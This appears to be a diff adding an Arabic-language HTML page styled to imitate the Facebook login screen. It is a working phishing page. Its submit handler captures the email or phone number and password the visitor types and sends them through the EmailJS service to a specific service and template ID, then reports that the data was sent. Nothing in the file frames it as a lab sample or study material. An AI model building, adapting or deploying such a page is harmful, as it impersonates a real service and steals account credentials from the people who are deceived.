@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول إلى فيس بوك</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            text-align: center;
+        }
+        .container h1 {
+            color: #1877f2;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        .input-group {
+            margin-bottom: 15px;
+        }
+        .input-group label {
+            display: block;
+            margin-bottom: 5px;
+            text-align: right;
+        }
+        .input-group input {
+            width: calc(100% - 20px); /* حجم الحقل بعرض 100% مع هامش 10px من كل جانب */
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            text-align: right; /* لضبط اتجاه النص */
+            margin: 0 auto; /* لتوسيط الحقل */
+            display: block; /* لجعل الحقل كامل العرض */
+        }
+        .button-group {
+            margin-top: 20px;
+        }
+        .button-group button {
+            width: 100%;
+            padding: 10px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        .button-group a {
+            display: block;
+            margin-top: 10px;
+            color: #1877f2;
+            text-decoration: none;
+            text-align: right;
+        }
+    </style>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+        (function(){
+            emailjs.init("user_YOUR_USER_ID");
+        })();
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h1>تسجيل الدخول إلى فيس بوك</h1>
+        <form id="loginForm">
+            <div class="input-group">
+                <label for="email">البريد الإلكتروني أو رقم الهاتف</label>
+                <input type="text" id="email" name="email">
+            </div>
+            <div class="input-group">
+                <label for="password">كلمة المرور</label>
+                <input type="password" id="password" name="password">
+            </div>
+            <div class="button-group">
+                <button type="submit">تسجيل الدخول</button>
+                <a href="#">هل نسيت كلمة المرور؟</a>
+            </div>
+        </form>
+        <hr>
+        <div class="button-group">
+            <button onclick="window.location.href='#'">إنشاء حساب جديد</button>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+
+            var templateParams = {
+                email: email,
+                password: password
+            };
+
+            emailjs.send('service_p9i9utt', 'template_9gg1gy8', templateParams)
+                .then(function(response) {
+                    console.log('SUCCESS!', response.status, response.text);
+                    alert('تم إرسال البيانات بنجاح');
+                }, function(error) {
+                    console.log('FAILED...', error);
+                    alert('فشل في إرسال البيانات');
+                });
+        });
+    </script>
+</body>
+</html>
